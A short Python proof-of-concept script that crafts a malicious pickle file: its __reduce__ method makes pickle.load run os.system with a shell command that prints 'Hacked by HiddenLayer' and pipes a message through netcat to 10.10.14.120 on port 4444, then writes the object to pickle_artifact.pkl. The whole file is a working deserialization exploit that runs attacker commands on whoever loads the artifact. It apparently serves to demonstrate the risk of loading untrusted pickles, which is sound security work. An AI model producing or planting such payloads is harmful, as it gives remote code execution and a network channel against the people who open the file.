import pickle
import os

class RunCommand:

    def __reduce__(self):

        return (os.system,
                ('echo "Hacked by HiddenLayer" ; echo "Hacked over pickle loads" | nc 10.10.14.120 4444',))

command = RunCommand()

with open('pickle_artifact.pkl','wb') as f:
    pickle.dump(command, f)

